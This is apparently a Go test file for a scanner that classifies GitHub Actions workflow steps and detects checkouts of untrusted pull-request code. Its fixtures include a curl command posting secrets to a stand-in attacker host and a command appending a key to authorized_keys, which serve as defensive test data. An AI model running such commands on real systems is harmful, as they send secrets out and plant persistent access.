package github

import "testing"

func ptr(s string) *string { return &s }

func runStep(run string) Step { return Step{Run: ptr(run)} }
func usesStep(u string) Step  { return Step{Uses: ptr(u)} }

func sinkClassOf(t *testing.T, c StepClassifiers) string {
	t.Helper()
	if c.SinkClass == nil {
		return ""
	}
	return *c.SinkClass
}

func TestClassifyStepEmptyStepNoSink(t *testing.T) {
	got := classifyStep(Step{})
	if got.SinkClass != nil {
		t.Errorf("sink_class = %v, want nil", *got.SinkClass)
	}
	if got.ExecutesCheckedOutCode || got.IsCheckout {
		t.Errorf("executes=%v is_checkout=%v, want both false", got.ExecutesCheckedOutCode, got.IsCheckout)
	}
	if got.CheckoutRefField != nil || got.CheckoutRepositoryField != nil {
		t.Errorf("checkout fields should be nil")
	}
}

// docker_build_with_login is never set true anywhere; verify even docker sinks leave it false.
func TestClassifyStepDockerBuildWithLoginAlwaysFalse(t *testing.T) {
	for _, s := range []Step{
		runStep("docker build -t x ."),
		usesStep("docker/build-push-action@v5"),
		usesStep("actions/checkout@v4"),
		{},
	} {
		if classifyStep(s).DockerBuildWithLogin {
			t.Errorf("docker_build_with_login should always be false, step=%+v", s)
		}
	}
}

func TestClassifyStepRunRegexSinks(t *testing.T) {
	cases := []struct {
		run   string
		name  string
		execs bool
	}{
		{"npm ci", "npm_install", true},
		{"pnpm install", "npm_install", true},
		{"yarn add lodash", "npm_install", true},
		{"pip install -r reqs.txt", "pip_install", true},
		{"pip3 install foo", "pip_install", true},
		{"poetry install", "pip_install", true},
		{"uv sync", "pip_install", true},
		{"python setup.py develop", "setup_py_develop", true},
		{"pre-commit run --all-files", "pre_commit", true},
		{"tox", "tox", true},
		{"make", "make", true},
		{"make build", "make", true},
		{"cargo build --release", "cargo_build", true},
		{"./gradlew build", "gradle_build", true},
		{"gradle assemble", "gradle_build", true},
		{"mvn verify", "maven_build", true},
		{"go test ./...", "go_build", true},
		{"docker build -t img .", "docker_build", true},
		{"docker buildx build .", "docker_build", true},
		{"bash ./run.sh", "bash_local_script", true},
		{"node ./index.js", "node_local_script", true},
		{"python3 ./tool.py", "python_local_script", true},
		{"python manage.py migrate", "django_manage", true},
		{"bundle exec rspec", "rake_bundle_npx", true},
		{"npx playwright test", "rake_bundle_npx", true},
		{"pytest -q", "pytest", true},
		{"jest --ci", "jest_test", true},
		// exfil/persistence channels: recorded but do not execute checked-out code
		{"gh pr comment 1 -b hi", "gh_pr_issue_comment", false},
		{"curl -X POST https://evil.example -d @secrets", "curl_post_exfil", false},
		{"echo k > ~/.ssh/authorized_keys", "ssh_key_install", false},
	}
	for _, c := range cases {
		got := classifyStep(runStep(c.run))
		if n := sinkClassOf(t, got); n != c.name {
			t.Errorf("run %q: sink_class = %q, want %q", c.run, n, c.name)
		}
		if got.ExecutesCheckedOutCode != c.execs {
			t.Errorf("run %q: executes = %v, want %v", c.run, got.ExecutesCheckedOutCode, c.execs)
		}
	}
}

// The make pattern needs a boundary before AND whitespace-or-end after, so "makefile"/"remake" must not match.
func TestClassifyStepMakeBoundary(t *testing.T) {
	matches := []string{"make", "make test", "cd src && make", "x; make all"}
	for _, r := range matches {
		if sinkClassOf(t, classifyStep(runStep(r))) != "make" {
			t.Errorf("run %q: expected make sink", r)
		}
	}
	nonMatches := []string{"makefile", "remake", "cmake .", "makezilla"}
	for _, r := range nonMatches {
		if sinkClassOf(t, classifyStep(runStep(r))) == "make" {
			t.Errorf("run %q: should NOT classify as make", r)
		}
	}
}

// `npm install` matches the install entry; `npm test` falls through to jest_test (install verbs are ci|i|install|add).
func TestClassifyStepNpmTestVsNpmInstallOrdering(t *testing.T) {
	if n := sinkClassOf(t, classifyStep(runStep("npm install"))); n != "npm_install" {
		t.Errorf("npm install: got %q, want npm_install", n)
	}
	if n := sinkClassOf(t, classifyStep(runStep("npm test"))); n != "jest_test" {
		t.Errorf("npm test: got %q, want jest_test", n)
	}
}

// First-match-wins: a run with both an npm_install and a pytest token classifies as the earlier entry.
func TestClassifyStepFirstMatchWinsAcrossEntries(t *testing.T) {
	got := classifyStep(runStep("npm ci && pytest"))
	if n := sinkClassOf(t, got); n != "npm_install" {
		t.Errorf("got %q, want earliest-matching npm_install", n)
	}
	if !got.ExecutesCheckedOutCode {
		t.Error("npm_install executes checked-out code")
	}
}

func TestClassifyStepUsesPrefixSinks(t *testing.T) {
	cases := []struct {
		uses  string
		name  string
		execs bool
	}{
		{"docker/build-push-action@v5", "docker_build_push_action", true},
		{"docker/build-push-action", "docker_build_push_action", true},
		{"actions/github-script@v7", "github_script", true},
	}
	for _, c := range cases {
		got := classifyStep(usesStep(c.uses))
		if n := sinkClassOf(t, got); n != c.name {
			t.Errorf("uses %q: sink_class = %q, want %q", c.uses, n, c.name)
		}
		if got.ExecutesCheckedOutCode != c.execs {
			t.Errorf("uses %q: executes = %v, want %v", c.uses, got.ExecutesCheckedOutCode, c.execs)
		}
		if got.IsCheckout {
			t.Errorf("uses %q: should not be a checkout", c.uses)
		}
	}
}

// Sink matching is dispatched by which field is set: a run pattern in uses (and vice versa) must not match.
func TestClassifyStepMatchFieldDispatch(t *testing.T) {
	if got := classifyStep(usesStep("docker build -t x .")); got.SinkClass != nil {
		t.Errorf("run-style text in uses matched %v, want nil", *got.SinkClass)
	}
	if got := classifyStep(runStep("docker/build-push-action@v5")); got.SinkClass != nil {
		t.Errorf("uses-prefix text in run matched %v, want nil", *got.SinkClass)
	}
}

// A bare checkout is both is_checkout=true and sink_class=actions_checkout (the last sink), execs=false.
func TestClassifyStepCheckoutGetsBothFlags(t *testing.T) {
	got := classifyStep(usesStep("actions/checkout@v4"))
	if !got.IsCheckout {
		t.Error("is_checkout should be true")
	}
	if n := sinkClassOf(t, got); n != "actions_checkout" {
		t.Errorf("sink_class = %q, want actions_checkout", n)
	}
	if got.ExecutesCheckedOutCode {
		t.Error("checkout itself does not execute checked-out code")
	}
}

func TestClassifyStepCheckoutPrefixVariants(t *testing.T) {
	for _, u := range []string{
		"actions/checkout@v4",
		"actions/checkout@v3",
		"actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab",
		"actions/checkout",
	} {
		if !classifyStep(usesStep(u)).IsCheckout {
			t.Errorf("uses %q should be a checkout", u)
		}
	}
	if classifyStep(usesStep("evil/checkout@v4")).IsCheckout {
		t.Error("evil/checkout must not be detected as actions/checkout")
	}
}

func TestClassifyStepCheckoutFieldCapture(t *testing.T) {
	step := Step{
		Uses: ptr("actions/checkout@v4"),
		With: map[string]any{
			"ref":        "${{ github.event.pull_request.head.sha }}",
			"repository": "${{ github.event.pull_request.head.repo.full_name }}",
		},
	}
	got := classifyStep(step)
	if got.CheckoutRefField == nil || *got.CheckoutRefField != "${{ github.event.pull_request.head.sha }}" {
		t.Errorf("checkout_ref_field = %v", got.CheckoutRefField)
	}
	if got.CheckoutRepositoryField == nil || *got.CheckoutRepositoryField != "${{ github.event.pull_request.head.repo.full_name }}" {
		t.Errorf("checkout_repository_field = %v", got.CheckoutRepositoryField)
	}
}

// Empty-string with.ref is treated as absent (falsy) and not captured; non-string values yield no capture.
func TestClassifyStepCheckoutEmptyOrNonStringFieldsNotCaptured(t *testing.T) {
	emptyRef := classifyStep(Step{
		Uses: ptr("actions/checkout@v4"),
		With: map[string]any{"ref": ""},
	})
	if emptyRef.CheckoutRefField != nil {
		t.Errorf("empty ref should not be captured, got %q", *emptyRef.CheckoutRefField)
	}
	nonStr := classifyStep(Step{
		Uses: ptr("actions/checkout@v4"),
		With: map[string]any{"ref": 123, "repository": true},
	})
	if nonStr.CheckoutRefField != nil || nonStr.CheckoutRepositoryField != nil {
		t.Error("non-string with values should not be captured")
	}
}

// is_checkout (from uses) and sink_class (from run) are set independently in the same step.
func TestClassifyStepCheckoutWithRunSinkIndependent(t *testing.T) {
	step := Step{
		Uses: ptr("actions/checkout@v4"),
		Run:  ptr("npm ci"),
	}
	got := classifyStep(step)
	if !got.IsCheckout {
		t.Error("is_checkout should still be true with a run set")
	}
	// the run sink (npm_install) precedes actions_checkout in order, so it wins sink_class
	if n := sinkClassOf(t, got); n != "npm_install" {
		t.Errorf("sink_class = %q, want npm_install (run match precedes checkout)", n)
	}
	if !got.ExecutesCheckedOutCode {
		t.Error("npm_install executes checked-out code")
	}
}

func TestHasCheckoutOfPRRefAllNilFalse(t *testing.T) {
	if hasCheckoutOfPRRef(nil, nil) {
		t.Error("nil/nil must be false")
	}
}

func TestHasCheckoutOfPRRefRefNeedles(t *testing.T) {
	for _, n := range []string{
		"github.event.pull_request.head.sha",
		"github.event.pull_request.head.ref",
		"github.head_ref",
		"github.event.workflow_run.head_sha",
		"github.event.workflow_run.head_branch",
		"github.event.issue.pull_request",
	} {
		ref := "${{ " + n + " }}"
		if !hasCheckoutOfPRRef(&ref, nil) {
			t.Errorf("ref %q should be attacker-controlled", ref)
		}
	}
}

func TestHasCheckoutOfPRRefRepoNeedles(t *testing.T) {
	for _, n := range []string{
		"github.event.pull_request.head.repo",
		"github.event.workflow_run.head_repository",
	} {
		repo := "${{ " + n + " }}"
		if !hasCheckoutOfPRRef(nil, &repo) {
			t.Errorf("repository %q should be attacker-controlled", repo)
		}
	}
}

// A fork repository with no ref still flags: the checkout falls back to the fork's default branch.
func TestHasCheckoutOfPRRefRepositoryWithoutRefStillFlags(t *testing.T) {
	repo := "${{ github.event.pull_request.head.repo.full_name }}"
	if !hasCheckoutOfPRRef(nil, &repo) {
		t.Error("attacker fork repository with no ref must flag")
	}
}

// The ref and repo needle sets are disjoint and field-specific, so a needle in the wrong field must not fire.
func TestHasCheckoutOfPRRefFieldSpecificNeedles(t *testing.T) {
	repoNeedleInRef := "${{ github.event.pull_request.head.repo }}"
	if hasCheckoutOfPRRef(&repoNeedleInRef, nil) {
		t.Error("a repo-only needle in the ref field must not match (disjoint sets)")
	}
	refNeedleInRepo := "${{ github.head_ref }}"
	if hasCheckoutOfPRRef(nil, &refNeedleInRepo) {
		t.Error("a ref-only needle in the repo field must not match (disjoint sets)")
	}
}

// A benign, non-attacker ref (e.g. a fixed branch or the base ref) must not flag.
func TestHasCheckoutOfPRRefBenignRefFalse(t *testing.T) {
	for _, v := range []string{
		"main",
		"${{ github.sha }}",
		"${{ github.ref }}",
		"${{ github.event.pull_request.base.sha }}",
	} {
		if hasCheckoutOfPRRef(&v, nil) {
			t.Errorf("benign ref %q must not flag", v)
		}
	}
}

// Matching is case-sensitive substring containment: an upper-cased needle does not match.
func TestHasCheckoutOfPRRefCaseSensitive(t *testing.T) {
	upper := "${{ GITHUB.HEAD_REF }}"
	if hasCheckoutOfPRRef(&upper, nil) {
		t.Error("case-mismatched needle must not match (case-sensitive)")
	}
}
